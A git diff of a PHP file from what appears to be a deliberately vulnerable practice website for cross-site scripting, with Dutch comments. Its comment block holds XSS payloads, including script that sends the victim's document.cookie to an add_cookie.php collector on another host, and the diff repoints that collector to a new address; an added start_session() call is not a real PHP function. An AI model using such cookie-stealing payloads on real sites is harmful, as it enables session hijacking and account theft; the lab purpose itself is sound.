@@ -1,4 +1,5 @@
 <?php
+
 /**
  * Created by PhpStorm.
  * User: janjaap
@@ -6,10 +7,13 @@
  * Time: 13:30
  */
 
+start_session();
 
 /*
  * Maak een nieuwe user aan met naam "jantje" en wachtwoord "<script>alert(document.cookie)</script>"
  * Of nog beter:
+ * http://192.168.2.15:1212/vulnerable_website/xss/
+ *
 <script>
 var http = new XMLHttpRequest();
 http.open(\'GET\', \'http://192.168.161.128/~janjaap/vulnerable_website/xss/add_cookie.php?cookie=\'+ encodeURIComponent(document.cookie),true);
@@ -17,7 +21,7 @@ http.send(null);
 </script>
 <script>
 var http = new XMLHttpRequest();
-http.open(\'GET\', \'http://localhost:8888/vulnerable_website/xss/add_cookie.php?cookie=\'+ encodeURIComponent(document.cookie),true);
+http.open(\'GET\', \'http://192.168.2.15:1212/vulnerable_website/xss/add_cookie.php?cookie=\'+ encodeURIComponent(document.cookie),true);
 http.send(null);
 </script>
 
